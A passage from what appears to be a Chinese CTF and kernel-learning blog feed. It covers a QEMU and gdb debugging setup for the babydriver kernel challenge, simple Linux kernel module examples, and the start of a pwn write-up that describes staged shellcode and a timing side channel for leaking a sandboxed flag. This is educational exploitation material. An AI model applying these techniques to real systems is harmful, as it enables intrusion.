class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>最后加上可执行权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chmod +x ./init<br></code></pre></td></tr></table></figure><p>打包脚本，把需要加载的驱动放在同级目录</p><blockquote><p>pack.sh</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>cp -r _install rootfs_tmp<br><span class="hljs-comment"># cp init rootfs_tmp/</span><br>cp babydriver.ko rootfs_tmp/<br><br><span class="hljs-comment"># gcc -g -static exp.c -o exp</span><br><span class="hljs-comment"># cp exp rootfs_tmp/</span><br><br>chmod +x rootfs_tmp/init<br>chmod g-w -R rootfs_tmp/<br>chmod o-w -R rootfs_tmp/<br>sudo chown -R root rootfs_tmp/<br>sudo chgrp -R root rootfs_tmp/<br>sudo chmod u+s rootfs_tmp/bin/busybox<br><br><span class="hljs-built_in">cd</span> rootfs_tmp/<br>find . | cpio -o -H newc &gt; ../rootfs.cpio<br><span class="hljs-built_in">cd</span> ..<br><br>sudo rm -rf rootfs_tmp/<br></code></pre></td></tr></table></figure><p>比赛给的init脚本如下 ，其默认使用insmod加载了名为babydriver.ko</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><h3 id="三、qemu运行内核"><a href="#三、qemu运行内核" class="headerlink" title="三、qemu运行内核"></a>三、qemu运行内核</h3><p>为了方便，直接把启动命令存为文件</p><blockquote><p>start.sh</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br>qemu-system-x86_64 \<br>-m 1024M \<br>-cpu kvm64,+smep,+smap\<br>-kernel ./bzImage \<br>-initrd ./rootfs.cpio \<br>-nographic \<br>-monitor none \<br>-append <span class="hljs-string">&quot;console=ttyS0 nokaslr quiet&quot;</span> \<br>-s<br></code></pre></td></tr></table></figure><p>部分参数说明如下：</p><ul><li><p><code>-m</code>：虚拟机内存大小</p></li><li><p><code>-kernel</code>：内存镜像路径</p></li><li><p><code>-initrd</code>：文件系统路径</p></li><li><p>-append：附加参数选项</p><ul><li><code>nokalsr</code>：关闭内核地址随机化，方便我们进行调试</li><li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code>进程会默认以<code>/etc/init.d/rcS</code>作为启动脚本</li><li><code>loglevel=3 </code>&amp; <code>quiet</code>：不输出log</li><li><code>console=ttyS0</code>：指定终端为<code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li></ul></li><li><p><code>-monitor</code>：将监视器重定向到主机设备<code>/dev/null</code>，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag</p></li><li><p><code>-cpu</code>：设置CPU安全选项，在这里开启了smep保护</p></li><li><p><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</p></li></ul><p><img src="https://i.loli.net/2021/10/22/RdyS3KlrM6QmoGE.png"></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>附上gdb调试脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>gdb -q \<br>-ex <span class="hljs-string">&quot;file vmlinux&quot;</span>\<br>-ex <span class="hljs-string">&quot;add-symbol-file babydriver.ko 0xffffffffc0000000&quot;</span>\ <span class="hljs-comment">#指定驱动代码段加载基址</span><br>-ex <span class="hljs-string">&quot;target remote localhost:1234&quot;</span><br>-ex <span class="hljs-string">&quot;b babyopen&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核初探</title>
    <link href="/2021/10/18/Linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2/"/>
    <url>/2021/10/18/Linux%E5%86%85%E6%A0%B8%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="可装载内核模块（LKM）"><a href="#可装载内核模块（LKM）" class="headerlink" title="可装载内核模块（LKM）"></a>可装载内核模块（LKM）</h2><p>Linux内核采用的是宏内核架构，一切的系统服务都需要由内核来提供，新服务的提供往往意味着要重新编译整个内核，于是可装载内核模块的出现大大提高了内核的可拓展性和可维护性。下面是一些基本的概念：</p><ul><li><p>可装载内核模块(LKM)是一段可以动态加载进内核的代码</p></li><li><p>在Linux内核源码树以外来开发并编译一个模块，称为树外开发</p></li><li><p>之所以提供模块机制，是因为Linux内核本身是一个单内核，单内核由于所有内容都集成在一起，效率很高，但可扩展性和可维护性较差，模块机制可弥补这一缺陷。</p></li></ul><blockquote><p>模块源代码 helloworld.c文件</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># include &lt;linux/init.h&gt;</span><br><span class="hljs-comment"># include &lt;linux/kernel.h&gt;</span><br><span class="hljs-comment"># include &lt;linux/module.h&gt;</span><br><br>//内核模块初始化函数<br>static <span class="hljs-built_in">int</span> __init verf1sh_init(void)<br>&#123;<br>printk(<span class="hljs-string">&quot;Hello world from kernel space\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>//内核模块退出函数<br>static void __exit verf1sh_exit(void)<br>&#123;<br>printk(<span class="hljs-string">&quot;Goodbye world leaving kernel space\n&quot;</span>);<br>&#125;<br><br>module_init(verf1sh_init);<br>module_exit(verf1sh_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;verf1sh&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>Makefile</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">#Makefile文件注意：假如前面的.c文件起名为first.c，那么这里的Makefile文件中的.o文<br>#件就要起名为first.o    只有root用户才能加载和卸载模块<br>obj-m:=helloworld.o                          #产生helloworld模块的目标文件<br>#目标文件  文件  要与模块名字相同<br>CURRENT_PATH:=$(shell pwd)             #模块所在的当前路径<br>LINUX_KERNEL:=$(shell uname -r)        <span class="hljs-meta">#linux内核代码的当前版本</span><br>LINUX_KERNEL_PATH:=/usr/src/linux-headers-$(LINUX_KERNEL)<br><br>all:<br>make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules    #编译模块<br>#[Tab]              内核的路径       当前目录编译完放哪  表明编译的是内核模块<br><br>clean:<br>make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean      #清理模块<br></code></pre></td></tr></table></figure><blockquote><p>编译模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">make<br></code></pre></td></tr></table></figure><blockquote><p>装载模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo insmod helloworld.ko<br></code></pre></td></tr></table></figure><blockquote><p>查看装载的模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">lsmod<br></code></pre></td></tr></table></figure><blockquote><p>卸载模块</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo rmmod helloworld<br></code></pre></td></tr></table></figure><h2 id="虚拟地址到物理地址"><a href="#虚拟地址到物理地址" class="headerlink" title="虚拟地址到物理地址"></a>虚拟地址到物理地址</h2><blockquote><p>模块源代码 paging_lowmem.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm_types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/export.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/delay.h&gt;</span></span><br><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cr0,cr3;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">get_pgtable_macro</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cr0 = read_cr0();<br>    cr3 = read_cr3_pa();<br>     <br>    printk(<span class="hljs-string">&quot;cr0 = 0x%lx, cr3 = 0x%lx\n&quot;</span>,cr0,cr3);<br>    <br>    printk(<span class="hljs-string">&quot;PGDIR_SHIFT = %d\n&quot;</span>, PGDIR_SHIFT);<br>    printk(<span class="hljs-string">&quot;P4D_SHIFT = %d\n&quot;</span>,P4D_SHIFT);<br>    printk(<span class="hljs-string">&quot;PUD_SHIFT = %d\n&quot;</span>, PUD_SHIFT);<br>    printk(<span class="hljs-string">&quot;PMD_SHIFT = %d\n&quot;</span>, PMD_SHIFT);<br>    printk(<span class="hljs-string">&quot;PAGE_SHIFT = %d\n&quot;</span>, PAGE_SHIFT);<br> <br>    printk(<span class="hljs-string">&quot;PTRS_PER_PGD = %d\n&quot;</span>, PTRS_PER_PGD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_P4D = %d\n&quot;</span>, PTRS_PER_P4D);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PUD = %d\n&quot;</span>, PTRS_PER_PUD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PMD = %d\n&quot;</span>, PTRS_PER_PMD);<br>    printk(<span class="hljs-string">&quot;PTRS_PER_PTE = %d\n&quot;</span>, PTRS_PER_PTE);<br>    printk(<span class="hljs-string">&quot;PAGE_MASK = 0x%lx\n&quot;</span>, PAGE_MASK);<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">vaddr2paddr</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pgd_t</span> *pgd;<br>    <span class="hljs-keyword">p4d_t</span> *p4d;<br>    <span class="hljs-keyword">pud_t</span> *pud;<br>    <span class="hljs-keyword">pmd_t</span> *pmd;<br>    <span class="hljs-keyword">pte_t</span> *pte;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> paddr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> page_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> page_offset = <span class="hljs-number">0</span>;<br>    pgd = pgd_offset(current-&gt;mm, vaddr); <span class="hljs-comment">// 根据当前虚拟地址和当前进程的mm_struct获取pgd项</span><br>    printk(<span class="hljs-string">&quot;pgd_val = 0x%lx, pgd_index = %lu\n&quot;</span>, pgd_val(*pgd),pgd_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pgd_none(*pgd))&#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pgd\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    p4d = p4d_offset(pgd, vaddr);<br>    printk(<span class="hljs-string">&quot;p4d_val = 0x%lx, p4d_index = %lu\n&quot;</span>, p4d_val(*p4d),p4d_index(vaddr));<br>    <span class="hljs-keyword">if</span>(p4d_none(*p4d))<br>    &#123; <br>        printk(<span class="hljs-string">&quot;not mapped in p4d\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    pud = pud_offset(p4d, vaddr);<br>    printk(<span class="hljs-string">&quot;pud_val = 0x%lx, pud_index = %lu\n&quot;</span>, pud_val(*pud),pud_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pud_none(*pud)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pud\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    pmd = pmd_offset(pud, vaddr);<br>    printk(<span class="hljs-string">&quot;pmd_val = 0x%lx, pmd_index = %lu\n&quot;</span>, pmd_val(*pmd),pmd_index(vaddr));<br>    <span class="hljs-keyword">if</span> (pmd_none(*pmd)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pmd\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    pte = pte_offset_kernel(pmd, vaddr);<br>    printk(<span class="hljs-string">&quot;pte_val = 0x%lx, ptd_index = %lu\n&quot;</span>, pte_val(*pte),pte_index(vaddr));<br><br>    <span class="hljs-keyword">if</span> (pte_none(*pte)) &#123;<br>        printk(<span class="hljs-string">&quot;not mapped in pte\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    page_addr = pte_val(*pte) &amp; PAGE_MASK;<br>    page_offset = vaddr &amp; ~PAGE_MASK;<br>    paddr = page_addr | page_offset;<br>    printk(<span class="hljs-string">&quot;page_addr = %lx, page_offset = %lx\n&quot;</span>, page_addr, page_offset);<br>    printk(<span class="hljs-string">&quot;vaddr = %lx, paddr = %lx\n&quot;</span>, vaddr, paddr);<br>    <span class="hljs-keyword">return</span> paddr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">v2p_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vaddr = <span class="hljs-number">0</span> ;<br>    printk(<span class="hljs-string">&quot;vaddr to paddr module is running..\n&quot;</span>);<br>    get_pgtable_macro();<br>    printk(<span class="hljs-string">&quot;\n&quot;</span>);<br>    vaddr = __get_free_page(GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (vaddr == <span class="hljs-number">0</span>) &#123;<br>        printk(<span class="hljs-string">&quot;__get_free_page failed..\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">sprintf</span>((<span class="hljs-keyword">char</span> *)vaddr, <span class="hljs-string">&quot;hello world from kernel&quot;</span>);<br>    printk(<span class="hljs-string">&quot;get_page_vaddr=0x%lx\n&quot;</span>, vaddr);<br>    vaddr2paddr(vaddr);<br>    ssleep(<span class="hljs-number">600</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">v2p_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    printk(<span class="hljs-string">&quot;vaddr to paddr module is leaving..\n&quot;</span>);<br>    free_page(vaddr);<br>&#125;<br><br><br>module_init(v2p_init);<br>module_exit(v2p_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/19/HrFM8iY3WnyIZ5l.png"></p><p><img src="C:\Users\14273\AppData\Roaming\Typora\typora-user-images\image-20211019213341747.png"></p><p><img src="https://i.loli.net/2021/10/21/jyEpGb6kH2XuZKl.png"></p><p>100100010 100111001 110000010 101001001 000000000000</p><p>0x122            0x139            0x182            0x149</p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="打印task-struct信息"><a href="#打印task-struct信息" class="headerlink" title="打印task_struct信息"></a>打印task_struct信息</h3><p>通过init_task遍历进程链表实现打印功能</p><blockquote><p>模块源代码 task_struct.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/fdtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/fs_struct.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/mm_types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;asm/atomic.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/init_task.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">print_pcb</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>, *<span class="hljs-title">p</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">pos</span>;</span><br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br><br>printk(<span class="hljs-string">&quot;begin...\n&quot;</span>);<br><br>task = &amp;init_task;<br>list_for_each(pos, &amp;task-&gt;tasks)<br>&#123;<br>p = list_entry(pos, struct task_struct, tasks);<br>count++;<br>printk(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>printk(<span class="hljs-string">&quot;pid: %d; stack: %p; state: %lx; prio: %d; static_prio: %d; parent&#x27;s pid: %d; file_count: %d; umask: %d;\n&quot;</span>, p-&gt;pid,p-&gt;<span class="hljs-built_in">stack</span> , p-&gt;state, p-&gt;prio, p-&gt;static_prio, (p-&gt;parent)-&gt;pid, atomic_read(&amp;(p-&gt;files)-&gt;count), (p-&gt;fs)-&gt;umask);<br><span class="hljs-keyword">if</span>(p-&gt;mm !=<span class="hljs-literal">NULL</span>)<br>printk(<span class="hljs-string">&quot;total_vm: %ld&quot;</span>, (p-&gt;mm)-&gt;total_vm);<br>&#125;<br><br>printk(<span class="hljs-string">&quot;进程的个数: %d\n&quot;</span>, count);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">exit_pcb</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(<span class="hljs-string">&quot;exiting...\n&quot;</span>);<br>&#125;<br><br>module_init(print_pcb);<br>module_exit(exit_pcb);<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/21/BfbZC8nQOlpxeFa.png"></p>]]></content>
    
    
    <categories>
      
      <category>kernel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>能源网络安全大赛pwn方向题解</title>
    <link href="/2021/10/15/%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"/>
    <url>/2021/10/15/%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/10/15/a6MKkJZz2deFBcm.png"></p><p>先简单记录一下，明天还有bytectf，有时间了再好好复盘一下，arm pwn都没时间看。</p><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>侥幸一血</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序逻辑很简单，考点也清晰，就是orw然后侧信道爆破flag。没见过这种就很难想到，今年的蓝帽杯，强网杯都出过这个考点。有个注意的点就是这个read限制了大小，得绕一下。</p><p><img src="https://i.loli.net/2021/10/15/Bh8I7UMoY4O6Vgt.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先写一段shellcode，read更多的字节，这样就可以把我们所有orw的shellcode写进去。由于程序开了沙箱，我们没法直接把flag打印出来。</p><p>方法1：用<code>cmp byte ptr[rsi+&#123;0&#125;],&#123;1&#125;;jz $-3;ret</code>去判断内存中的flag值跟我们输入的值是否相等，若判断成功，就往跳转到它的上一条地址处执行，一直循环，这时候就可以通过<code>p.recvline(timeout=1)</code>看程序是否超时，如果超时则表明flag匹配成功。结束，接着爆破flag的第二位，以此往复。（这种可以是可以但是爆破太慢了）</p><p>方法2：不用<code>jz</code>指令了，换成<code>ja</code>指令二分法爆破</p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>绕过read大小限制</strong></p><p>我在第一段read的时候又写了一段read的shellcode，read执行完下一跳指令地址是0x10015，所以把read的第二个参数设置成0x10015，第三个参数尽量大一点，那么就可以通过我们自己设置的read把shellcode写进去。</p><p>pwntools自带的shellcraft就可完成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.send(asm(shellcraft.read(<span 